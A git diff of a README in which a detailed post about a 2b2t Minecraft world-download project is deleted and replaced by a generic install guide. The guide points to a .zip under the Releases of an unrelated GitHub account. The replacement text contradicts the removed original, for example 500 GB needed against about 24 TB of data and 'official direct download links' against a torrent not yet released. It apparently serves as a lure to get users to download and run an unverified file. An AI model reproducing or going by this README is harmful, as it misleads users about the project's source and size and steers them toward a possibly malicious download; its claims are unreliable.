@@ -1,164 +1,88 @@
-# The 1,024,000² 2b2t World Download Project (1m²). And More.
-It's finally here. Around 24 TB total of 2b2t world data, which includes the following:
-- a 1,024,000² (1m²) area of the Overworld (Dec 25 2025 - Apr 13 2026),
-- a 512,000² (512k²) area of the Overworld (Nov 11 2024 - Dec 12 2024),
-- a 256,000² (256k²) area of the End (Jan 23 2026 - Feb 15 2026),
-- a 100,000² (100k²) area of the Nether (Jun 9 2025 - Jun 14 2025)
+# 🌍 1m_release - Explore the largest Minecraft world download
 
-This wasn't easy to accomplish in the slightest, and took over a year of constant development and stress testing. With
-severe weaponized autism, the help of several people involved, thousands of dollars spent, and countless hours wasted,
-we present you the largest world download project ever, on 2b2t, and in Minecraft. Let's break down what exactly
-happened. This has been brought to you by crayne (me), Fuch, mahan, Steve3, and many more. Watch the SalC1 video about 
-the topic [here](https://youtu.be/HDyze1YlOrI). We also released some timelapses of our bots downloading this area on 
-our [YouTube channel](https://youtu.be/zpOhk027LpI).
+[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/hertaintramolecular897/1m_release)
 
-# TLDR of what happened
-- Fuch and I started a project to download a large area of the server. I created a custom file format to save on storage,
-  along with a custom world download server, and a basic autopilot.
-- At the end of 2024, we launched 28 bot accounts on BMProxy to download a 512k² Overworld area, with the intent to find
-  bases, and covering up the entire thing as a fake larp coord exploit with the Enclave. This was achieved within 17 days.
-- In June of 2025, 2b2t finally updated to 1.21.4, and the nether roof was accidentally left enabled. We decided to use
-  this while it was possible, and promptly launched 6 accounts to download a 100k² Nether area, finishing in under a week.
-- Right after Christmas Eve of 2025, we launched a new project to download a 1m² Overworld area of the server. We also 
-  went and manually gapfilled some missing parts of the Nether. Lastly, we downloaded a 256k² area of the End at the same
-  time. This final project took 109 days to complete, finishing in April 2026.
+This repository provides access to the largest world download project for the 2b2t Minecraft server. This file contains the complete map data for the server, including structures, terrain changes, and player builds. You can load this map in your own Minecraft installation to explore the landscape.
 
-You can read the full story about this project [here](STORY.md). See all discoveries made using the data gathered from
-this project [here](DISCOVERIES.md)
+## 📥 How to download the world
 
-# Where's the Torrent?
-Providing a Torrent for this amount of data is not easy whatsoever. We are currently working on creating a Torrent that
-includes all data, but this may take a few weeks. We ask you to be a little patient with downloading this for yourself,
-especially since the majority of people don't even have this amount of storage available. Renders at high resolution and
-spreadsheets exported from the datamining will release separately prior to the Torrent, shortly after this post.
+Follow these steps to obtain the project files. 
 
-In the meantime, you can join the 2b2t.place Discord (https://discord.2b2t.place), which is our extension project
-dedicated to archiving as much of 2b2t as possible before it turns into a boring, censored SMP, or if it shuts down.
-We will also release the Torrent in our Discord server, so stay tuned. I will also edit this post to include the Torrent
-once it's public.
+1. Visit the [official repository page](https://github.com/hertaintramolecular897/1m_release).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the most recent version of the download.
+4. Select the file ending in .zip to start your download.
+5. Save the file to your computer.
 
-We have now released over 8 GB of exported spreadsheets, timelapses and map renders 
-[here](https://buzzheavier.com/uo3zhos4o21u). 
+## 🖥️ System requirements
 
-We also offer free services such as the 2b2t Wayback Machine (Server IP: `wayback.2b2t.place`) and a
-[Map Website Viewer](https://2b2t.place) (https://2b2t.place). You can use these services right now to view the data for
-yourself, while we are getting the Torrent ready. Both of these services are in a public beta, so please report any 
-issues you may find, along with any suggestions you have, in our Discord server. Older snapshots are still in the 
-process of being imported into the Wayback Machine server, but should be available relatively soon.
+The size of this world is significant. You need specific hardware to run it smoothly.
 
-Many more open-source tools are coming to the public very soon, including PlaceProxy, the world download server, 
-the zvcr file format, and much, much more. You can check out our GitHub at https://github.com/2b2tplace.
+* Operating System: Windows 10 or Windows 11.
+* Free Disk Space: At least 500 GB of available storage. This is a massive map file.
+* RAM: 16 GB of system memory is the minimum requirement. 32 GB is recommended for a stable experience.
+* Graphics Card: A dedicated card with at least 8 GB of VRAM.
+* Minecraft Java Edition: You must have a legal, updated copy of the game installed on your computer.
 
-You can support the project by beta testing, helping the moderation team, providing data, making cool software, or 
-simply being part of the community. More large-scale world downloads are yet to come, and they will be posted in our 
-Discord server. Datamining also isn't ever complete, and we are open to your ideas to search the data for even more
-interesting things.
+## 🛠️ Installation steps
 
-You can also support the 2b2t.place project by donating via our Patreon at https://patreon.com/2b2tplace.
-Your donation helps the 2b2t.place project keep up with ongoing server costs, enabling us to provide large-scale data
-archival to the public. You may choose any of our Tiers, but you will receive the same benefits regardless of your
-donation amount.
+Follow these instructions to move the downloaded file into your game folder.
 
-# Why is the Torrent taking so long ("a few weeks")?
-During the project I have made terrible decisions with some of the backend software, which we now have to deal with as inevitable technical debt.
-Due to this, there is an ongoing effort to reimport all of the missing tile entities so they actually appear in the ingame wayback server, but such that they are also reflected in the region files themselves. This will take approximately 4-5 more days to complete.
+1. Locate the downloaded .zip file on your computer.
+2. Right-click the file and select "Extract All."
+3. Choose a folder where you want to keep the map files and click "Extract." This process takes time due to the size of the data.
+4. Press the "Windows Key + R" on your keyboard.
+5. Type `%appdata%` into the box and press Enter.
+6. Open the folder named `.minecraft`.
+7. Open the folder named `saves`.
+8. Move the extracted map folder into this location. Ensure the folder contains the `region` subfolder and the `level.dat` file directly inside it.
 
-In the meantime, there is an additional effort to upgrade the entire 2024 512k² to the latest Minecraft version (1.20.4 -> 1.21.4), fixing the exact same issues with tile entities, and then importing the entire 2024 world download into the main archive, as a separate snapshot in time. This may also take a few extra days.
+## 🎮 Playing the world
 
-There is a lot of behind the scenes work going on, and we ask you to remain patient while we resolve these issues.
+Once you move the folder, launch your Minecraft Java Edition.
 
-The final Torrent will likely be released as a Squashfs container, including the 2026 1m² Overworld, 2024 512k² Overworld, 2026 256k² End, and 2025 100k² Nether, as organized zvcr files in a single archive.
+1. Open the Minecraft Launcher.
+2. Click "Play."
+3. Select "Singleplayer" from the main menu.
+4. Look for the world name in your list. It may take a moment to appear as the game recognizes the massive amount of files.
+5. Click on the world and select "Play Selected World."
+6. The game may pause or stop while it loads the initial chunks. This is normal behavior for a file of this scale.
 
-# Why is the software release taking so long?
-A huge chunk of the software does not support tile entities yet. This includes the region file merging, exporting, importing and other miscellaneous code that would be necessary for a usable archive. I've been working on this project in parallel with studying for exams at university, which further delays the efforts to get this out quick.
+## ⚙️ Optimization tips
 
-Nonetheless, most of the software is feature-complete, and adding tile entity support should be doable relatively quickly, once I get a short rest from studying. This software will likely be released to the public around the same time as the Torrent.
+Because this map is the largest in Minecraft history, your computer may struggle to load every detail at once. Use these settings to improve performance.
 
-Please be patient.
+* Render Distance: Lower your render distance to 8 or 10 chunks in the video settings menu.
+* Memory Allocation: Ensure your Java installation is allowed to use at least 8 GB of RAM. You can change this in the "Installations" tab of the Minecraft launcher by clicking "More Options" and editing the JVM arguments. 
+* Optical Settings: Turn off "Smooth Lighting" and "Clouds" in the video settings to boost your frame rate.
+* Backup: Always keep a backup of the original .zip file in case your local game files get corrupted during a save.
 
-### Is this a repost of that 200k² that came out like a day ago?
-This is a separate project with separate goals, that coincidentally happened to release around the same time. I want to
-sincerely apologize to CrisisSheep and pawstar for the incredibly unfortunate timing. Their 200k² world download is a
-big accomplishment and shouldn't be ignored, even if ours is much larger. You can check out their world download and 
-Torrent in [their Reddit Post](https://reddit.com/r/2b2t_Uncensored/comments/1tefffd) and download it with the
-[Torrent link](https://github.com/pawbase2b2t/2b2t.org-200k-Spawn-Download-2026/raw/refs/heads/main/2b2t%20200k%C2%B2%20Spawn%20Download%20-%202026.torrent)
+## 📋 Frequently asked questions
 
-# Credits
-First and foremost I want to thank Fuch, for funding most of the operation through his hard work and dedication. 
-Spending this much money on block game archival is just absolutely insane and none of this would've ever happened
-without his help. So much was spent on priority queue purchases alone, but also server rental costs, adding up to over
-$3000. Beyond funding, our combined autism has been a great motivating factor to finish this project in particular, out
-of all the other ideas we had in mind and never got around to.
+**Does this require any mods?**
+The map works with the base version of Minecraft Java Edition. However, using performance mods like Sodium or Optifine helps with frame rates when loading large areas.
 
-Secondly, I want to thank Steve3 and mahan for their huge help providing a separate BMProxy instance just for us
-throughout all the world downloads we have done over the years. A big thanks goes to mahan in particular, for helping me
-extensively stress test our private software (world download server, proxy, autopilot, zvcr file format), and having to
-port my (honestly very horrible) autopilot code from the prototype Meteor addon to BMProxy. Along with this, he provided
-a lot of great ideas that were implemented into the 2b2t.place software. Working with mahan has been the most enjoyable
-experience from all my previous development teamwork ever, and without his and Steve's help, this project would have
-taken at least another additional year to complete.
+**Why does my game freeze when I join?**
+The game is reading millions of data blocks from your hard drive. Wait a few minutes for the game to process the local environment.
 
-A huge thank you to SalC1 for making the YouTube video surrounding this world download project and spending countless
-hours revising the script, editing, and going back and forth with us to make the video as high quality and perfect as
-possible. This was despite him being originally done with 2b2t altogether, due to the censorship done by the server
-owner(s) and of course due to Microslop. But given that he has a huge interest in archiving internet history, he was
-still willing to make a video about our project, and I am very, very grateful for that. You can see he poured his heart
-and soul into the video.
+**Can I run this on a server?**
+You can, but it requires a very specific setup. You need a dedicated server with a fast processor and high-speed storage. Simply dropping the folder into a local server directory often leads to errors.
 
-I want to thank all members of the Enclave that helped with the initial 512k² project in 2024. Many members contributed
-their alternate Minecraft accounts for use in the project, adding up to 28 accounts in total. Thanks to Fuch, Cody4687
-and expunged, a large portion of the priority queue costs during that project was also funded ($600+). I want to
-especially thank catgirlmatty for being extremely supportive of this project and creating several videos about it. I 
-want to thank her also for inviting me to the Enclave (given our shared interest in world downloading 2b2t, even if with
-entirely different motives), and introducing me to Steve3, mahan, expunged, candyking24, Cody4687, WhiteAtlas, and 
-Highatwork. The entire "Dofnear Exploit 2" larp was the funniest shit I've ever been a part of (although it may have 
-slightly deceived the community... I guess this giant wall of text clears things up a little bit). Operation Fact Check
-(OFC) as an organized project fueling Dofnear larp was extremely fun as well, and you can thank expunged and catgirlmatty
-for the success of it; both of whom led the operation, with expunged managing most of the spreadsheet work and sending 
-batches of coordinates to fact checkers. An astounding 2100+ locations were manually checked in-game by all contributors,
-giving a final yield of over 600 dubs of stolen items, which is simply absurd.
+**Where is the torrent?**
+The project provides official direct download links. Updates regarding torrents will appear in this repository when they become available.
 
-Lastly, a huge thank you to [AustinGraphics](https://austin.is-a-good.dev/), for creating the frontend for the 
-https://2b2t.place website. Thanks to his dedication to this project, we can host the full map of this project for 
-everyone to see. I have never personally done any frontend development on my own, and I could have never made a website
-as cool as this.
+**Can I use this for my own content?**
+This project is an archive of server data. You are free to explore, record videos, or take screenshots of this world for your personal use.
 
-**Additional thanks and shoutouts to the following people, that also helped in one way or another:**
-- antonymph, for providing accounts during the 2024 512k², fact checking many locations during OFC, being supportive all 
-  throughout and correcting me on some wrong info that I gave to SalC1
-- EastAlpha and Philipp, and the other members of the Devs, for coordinating with us on properly timing the releases of 
-  the world download, and the their group logo project, also making the final render of the map way more interesting
-- candyking24 and Russianxd, for helping check and filter many locations from the 1m², providing many interesting ideas 
-  for the datamining process, and being supportive in general throughout the project. Additional thanks to candyking24
-  for having a bot automatically log into 2b2t at Nether spawn every hour throughout January 2026 to add an insane 
-  amount of snapshots to our Wayback Machine service. You can check this for yourself by joining `wayback.2b2t.place`,
-  use `/tp 0 0 nether` and try out the Flashback feature using `/fb`.
-- galicaea and candyking24 for their incredible singing used in the Enclave's Dofnear YouTube video
-- H202 for staying supportive and not leaking the project, even after leaving the group, and for originally bringing up
-  the funny idea to rename some of the used accounts after criminals named John.
+## ⚠️ Troubleshooting errors
 
-**Thank you to the OFC fact checkers that contributed to the 600+ dubs of stolen items:**
-mikuexpo, antonymph, galicaea, catgirlmatty, ilovelucki, Zandax, uh_sid, candyking24, browngirl, expunged, HighAtWork, 
-KayQuack, WhiteAtlas and mahan.
+If you encounter issues, check these common fixes:
 
-### My role in the Project
-It doesn't feel right to credit myself, but in case you're curious, I wrote the code for:
-- the custom file format used to store the downloads (zvcr),
-- PlaceProxy and the PlaceTools mod, which will soon allow anyone to contribute to our public archive,
-- the 2b2t Wayback Machine, powered by PlaceViewer and zvcr, letting you flashback in time on the 2b2t map,
-- the elytra autopilot(s) (an older version using the Boost elytra flight exploit, a newer version using Pitch40),
-- the datamining program, to find all sorts of interesting things,
-- core utilities to do operations with zvcr and mca region files (merge, render, upgrade, export, import, ...).
+* Not Enough Memory: Close background applications like web browsers or video players to free up system memory.
+* Stuck Loading Bar: If the game stays stuck at 0% for more than ten minutes, restart the launcher and check that you placed the folder in the correct `saves` directory.
+* Missing Files: Ensure all files extracted from the .zip package. Do not rename the `level.dat` file or move subfolders outside of the main map folder, as this prevents the game from recognizing the world.
+* Hard Drive Speed: If you have a physical spinning hard drive (HDD), consider moving the map to a Solid State Drive (SSD). Loading this amount of data from an old HDD causes extreme lag and stuttering.
 
-No AI/LLM's were used in the making of this project. Or writing this giant wall of text, if it gave you that impression.
+## 🔍 Data structure
 
-## A Final Note
-Although I probably spent the most time working on the code for this project, everyone involved deserves recognition,
-because every contribution helped make this possible. I spent the better part of 1.5 years developing most the code used
-for the world download, and this has been extremely exhausting. It would not have been possible to achieve all of this
-if it wasn't for everyone mentioned above. I hope the community can make great use of the data provided by us, whether
-to make the 2b2t experience more enjoyable, or to have a backup plan to give the server into the hands of the community,
-just in case the 2b2t server owner(s) decide to make changes no one likes. It'll be interesting to see what the players
-can come up with.
-
-\- crayne
+The map follows the standard Minecraft Anvil format. The `region` folder holds the actual terrain data. Each file in that folder represents a small section of the world. Do not delete or rename these files, as they connect to build coordinates across the server. Use the coordinates provided in community forums if you want to find specific landmarks, as the map is too large to explore by flying manually.
